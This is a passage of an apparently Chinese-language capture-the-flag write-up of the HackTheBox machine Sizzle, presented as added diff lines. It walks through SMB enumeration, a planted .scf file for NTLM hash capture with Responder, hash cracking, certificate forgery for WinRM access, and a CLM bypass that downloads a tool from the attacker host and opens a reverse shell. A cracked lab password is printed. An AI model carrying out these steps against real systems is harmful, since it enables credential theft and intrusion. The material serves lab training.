+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir mnt</span><br><span class="line">mount -t cifs <span class="string">&quot;//10.10.10.103/Department Shares&quot;</span> mnt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.36.57.png" alt="截屏2021-11-30 下午9.36.57"><br>再次遍历后结果显示所有文件都是空值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat xxx | xxd</span><br></pre></td></tr></table></figure>
+<p>但是其中还存在一个<code>Users</code>目录，包含了多个用户名<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.41.02.png" alt="截屏2021-11-30 下午9.41.02"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">amanda</span>  <span class="string">amanda_adm</span>  <span class="string">bill</span>  <span class="string">bob</span>  <span class="string">chris</span>  <span class="string">henry</span>  <span class="string">joe</span>  <span class="string">jose</span>  <span class="string">lkys37en</span>  <span class="string">morgan</span>  <span class="string">mrb3n</span>  <span class="string">Public</span></span><br></pre></td></tr></table></figure>
+
+<p>通古以下脚本进行遍历检查当前共享名下的写入权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> d | <span class="keyword">while</span> <span class="built_in">read</span> directory; <span class="keyword">do</span> </span><br><span class="line">    touch <span class="variable">$&#123;directory&#125;</span>/0xdf 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write file&quot;</span> &amp;&amp; rm <span class="variable">$&#123;directory&#125;</span>/0xdf; </span><br><span class="line">    mkdir <span class="variable">$&#123;directory&#125;</span>/0xdf 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write dir&quot;</span> &amp;&amp; rmdir <span class="variable">$&#123;directory&#125;</span>/0xdf; </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.59.05.png" alt="截屏2021-11-30 下午9.59.05"><br>存在两个目录拥有写入权限，进入<code>/Users/Public</code>并写入测试文件<code>mac.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Users/Public</span><br><span class="line">touch mac.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%8810.02.00.png" alt="截屏2021-11-30 下午10.02.00"><br>成功写入文件，但过一会回去看它会自动消失</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -d <span class="string">&quot;ls /mnt/Users/Public/*; ls /mnt/ZZ_ARCHIVE/*&quot;</span></span><br></pre></td></tr></table></figure>
+<p>经过测试发现其中的文件每隔4分钟清除一次</p>
+<h2 id="0x02-上线-amanda"><a href="#0x02-上线-amanda" class="headerlink" title="0x02 上线[amanda]"></a>0x02 上线[amanda]</h2><p>现在我们知道该靶机中存在用户交互，通过 Windows 资源管理器（.scf）使用户访问该文件的目录时打开 SMB 连接，比如在<code>mac.scf</code>中包含一个可以远程的图标路径。可在目标主机上放置<code>mac.scf</code>，并通过程序响应来捕获<code>NTLM v2</code>的哈希值</p>
+<h3 id="获取NTLM哈希值"><a href="#获取NTLM哈希值" class="headerlink" title="获取NTLM哈希值"></a>获取NTLM哈希值</h3><p>首先创建 scf 文件并将其放到 Public 目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp mac.scf mnt/Users/Public </span><br></pre></td></tr></table></figure>
+<p>具体内容如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">Shell</span>]</span><br><span class="line"><span class="string">Command=2</span></span><br><span class="line"><span class="string">IconFile=\\10.10.14.3\icon</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 Responder 监听 tun0 网卡，成功收到响应报文</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%8811.45.30.png" alt="截屏2021-11-30 下午11.45.30"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">amanda::HTB:e0d93f9ed39533f0:CC05038D74917172FF7DBBDF574D466F:010100000000000000115E15D5E5D701671F0C8E2D9F87EC0000000002000800470032005400380001001E00570049004E002D004F005A005A0051005200550058004B004D004A00310004003400570049004E002D004F005A005A0051005200550058004B004D004A0031002E0047003200540038002E004C004F00430041004C000300140047003200540038002E004C004F00430041004C000500140047003200540038002E004C004F00430041004C000700080000115E15D5E5D70106000400020000000800300030000000000000000100000000200000618685F222EA1F2B581F5A3E318D00997B3ED8A8504849C36733BA7C7E72A9AA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003300000000000000000000000000</span> </span><br></pre></td></tr></table></figure>
+<h3 id="哈希值破解"><a href="#哈希值破解" class="headerlink" title="哈希值破解"></a>哈希值破解</h3><p>使用 hashcat 对其中的哈希值进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%8811.49.18.png" alt="截屏2021-11-30 下午11.49.18"><br>成功破解密码为<code>Ashare1972</code>，使用该账号密码检查 smb 共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.103 -u amanda -p Ashare1972</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8812.01.53.png" alt="截屏2021-12-01 上午12.01.53"></p>
+<h3 id="登陆服务"><a href="#登陆服务" class="headerlink" title="登陆服务"></a>登陆服务</h3><h4 id="smb登陆"><a href="#smb登陆" class="headerlink" title="smb登陆"></a>smb登陆</h4><p>使用 smbclient 连接目标 smb 共享 CertEnroll</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U <span class="string">&#x27;amanda%Ashare1972&#x27;</span> //10.10.10.103/CertEnroll</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.13.43.png" alt="截屏2021-12-01 上午9.13.43"><br>其中存在许多证书，但是并没有发现可利用点</p>
+<h4 id="LDAP信息获取"><a href="#LDAP信息获取" class="headerlink" title="LDAP信息获取"></a>LDAP信息获取</h4><p>使用 ldapdomaindump 通过收集活动目录信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapdomaindump -u <span class="string">&#x27;htb.local\amanda&#x27;</span> -p Ashare1972 10.10.10.103 -o ldap/</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.27.43.png" alt="截屏2021-12-01 上午9.27.43"><br>在其中获取到如下信息，其中包含计算机信息、用户信息等。与此同时可知靶机处于域环境内，用户 sizzler 是域管理员<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.28.45.png" alt="截屏2021-12-01 上午9.28.45"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.29.07.png" alt="截屏2021-12-01 上午9.29.07"></p>
+<p>在谷歌中搜索 certenroll 发现这是域认证服务，其中还包含目录<code>certsrv</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.56.34.png" alt="截屏2021-12-01 上午9.56.34"><br>访问站点目录<code>http://10.10.10.103/certsrv</code>出现跳出登录界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.59.54.png" alt="截屏2021-12-01 上午9.59.54"></p>
+<p>输入用户 amanda 的账号密码后成功登录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.01.31.png" alt="截屏2021-12-01 上午10.01.31"></p>
+<p>那么为什么之前 gobuster 无法扫描到该目录呢？再次扫描进行查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.103 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt -t 20 </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.07.19.png" alt="截屏2021-12-01 上午10.07.19"><br>这次直接使用 IIS 的 fuzz 字典扫描到了目标目录，说明之前的字典中未包含该目录</p>
+<h4 id="WinRM登陆"><a href="#WinRM登陆" class="headerlink" title="WinRM登陆"></a>WinRM登陆</h4><p>登录后页面允许我生成一个证书，说明我可以冒充用户 amanda 的身份，接下来我需要对应的证书和密钥来通过身份认证。openssl 是个不错的选择。通过它可以生成密钥（key）和证书签名请求（csr）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.21.44.png" alt="截屏2021-12-01 上午10.21.44"><br>查看证书签名请求（csr）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat amanda.csr</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.22.21.png" alt="截屏2021-12-01 上午10.22.21"><br>切换至站点并在其中找到证书生成界面，选择高级证书请求<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.15.09.png" alt="截屏2021-12-01 上午10.15.09"><br>粘贴之前的证书签名请求（csr）后点击提交<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.24.25.png" alt="截屏2021-12-01 上午10.24.25"><br>成功生成并下载证书<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.32.12.png" alt="截屏2021-12-01 上午10.32.12"></p>
+<p>将证书移至本目录下并重命名为 amanda.cer</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv ~/Downloads/certnew.cer amanda.cer</span><br></pre></td></tr></table></figure>
+<p>有了证书和密钥我们可以通过 WinRM 与 amanda 身份来进行身份验证。对 Alamot 的 Ruby 脚本稍作修改如下</p>
+<p><em><strong>原脚本地址：<a target="_blank" rel="noopener" href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb</a></strong></em></p>
+<blockquote>
+<p>Windows 远程管理 (WinRM) 是WS-Management Protocol的 Microsoft 实现，WS-Management Protocol是一种基于标准简单对象访问协议 (SOAP) 的防火墙友好协议，允许来自不同供应商的硬件和操作系统进行互操作。WS-Management 协议规范为系统提供了一种在 IT 基础设施中访问和交换管理信息的通用方法。WinRM 和智能平台管理接口 (IPMI)以及事件收集器是Windows 硬件管理功能的组件。</p>
+</blockquote>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;winrm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new( </span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">&#x27;https://10.10.10.103:5986/wsman&#x27;</span>,</span><br><span class="line">  <span class="symbol">transport:</span> <span class="symbol">:ssl</span>,</span><br><span class="line">  <span class="symbol">client_cert:</span> <span class="string">&#x27;/root/hackthebox/Machines/Sizzle/cert/amanda.cer&#x27;</span>,</span><br><span class="line">  <span class="symbol">client_key:</span> <span class="string">&#x27;/root/hackthebox/Machines/Sizzle/cert/amanda.key&#x27;</span>,</span><br><span class="line">  <span class="symbol">:no_ssl_peer_verification</span> =&gt; <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">&quot;exit\n&quot;</span> <span class="keyword">do</span></span><br><span class="line">        output = shell.run(<span class="string">&quot;-join($id,&#x27;PS &#x27;,$(whoami),&#x27;@&#x27;,$env:computername,&#x27; &#x27;,$((gi $pwd).Name),&#x27;&gt; &#x27;)&quot;</span>)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = gets        </span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    puts <span class="string">&quot;Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>在该脚本可以看到连接为SSL，其中指定了证书和密钥来连接目标的5986端口，连接后直接返回 powershell 命令行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby winrm_shell.rb</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8811.00.03.png" alt="截屏2021-12-01 上午11.00.03"></p>
+<p>注意：如果报错，无法加载 winrm 包，可以执行以下命令来进行安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gem install winrm</span><br><span class="line">gem install winrm-fs</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-权限提升-mrlky"><a href="#0x03-权限提升-mrlky" class="headerlink" title="0x03 权限提升[mrlky]"></a>0x03 权限提升[mrlky]</h2><h3 id="受限环境"><a href="#受限环境" class="headerlink" title="受限环境"></a>受限环境</h3><p>执行命令可发现当前运行环境处于受限模式，同时 AppLocker 会限制运行内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$executioncontext</span>.sessionstate.languagemode</span><br><span class="line">Get-AppLockerPolicy -Effective -XML</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8811.26.16.png" alt="截屏2021-12-01 上午11.26.16"></p>
+<h3 id="绕过CLM"><a href="#绕过CLM" class="headerlink" title="绕过CLM"></a>绕过CLM</h3><h4 id="PSByPassCLM"><a href="#PSByPassCLM" class="headerlink" title="PSByPassCLM"></a>PSByPassCLM</h4><p>使用 PSByPassCLM 可突破 CLM(Constrained Language Mode)，首先将其上传到<code>\users\amanda\appdata\local\temp\</code>目录下<br><em><strong>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/padovah4ck/PSByPassCLM">https://github.com/padovah4ck/PSByPassCLM</a></strong></em></p>
+<p>在本地开启 http 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>在靶机中下载 PSByPassCLM.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.3/PsBypassCLM.exe -OutFile PsBypassCLM.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%883.01.55.png" alt="截屏2021-12-01 下午3.01.55"><br>同时在本地开启监听服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p>在靶机上利用 PsBypassCLM 执行命令绕过CLM完成反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=<span class="literal">true</span> /U /revshell=<span class="literal">true</span> /rhost=10.10.14.3 /rport=5555 \users\amanda\appdata\<span class="built_in">local</span>\temp\PsBypassCLM.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%883.13.41.png" alt="截屏2021-12-01 下午3.13.41"><br>成功收到反弹shell</p>
+<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>也可以使用 MSF 来生成 shellcode 用于执行反弹shell</p>
